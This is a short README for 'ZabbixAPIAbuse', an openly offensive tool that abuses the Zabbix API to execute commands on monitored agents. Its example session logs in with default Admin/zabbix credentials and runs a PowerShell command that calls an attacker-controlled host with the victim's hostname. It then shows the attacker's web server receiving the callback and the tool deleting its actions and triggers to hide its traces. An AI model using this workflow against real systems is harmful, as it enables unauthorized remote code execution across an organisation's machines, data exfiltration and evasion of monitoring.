# ZabbixAPIAbuse
ZabbixAPIAbuse is an abusing tool for Zabbix API to execute commands on zabbix agents.

## Requirements
```
python3 -m pip install requests
```

## Example
```
python3 ZabbixAPIAbuse.py
URL: http://localhost/zabbix/api_jsonrpc.php
CMD: powershell -c "Invoke-WebRequest -Uri http://192.168.1.100/$(hostname)"
Method [Default: action] (action / item): action
Username [Default: Admin]: Admin
Password [Default: zabbix]: zabbix
[0]: DESKTOP-XXXXXXX
[1]: DESKTOP-XXXXXXY
Host num: 0
[*] Waiting for execution ...
[*] Actions deleted
[*] Triggers deleted
```

```
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
192.168.1.108 - - [11/May/2020 13:36:23] "GET /DESKTOP-XXXXXXX HTTP/1.1" 404 -
```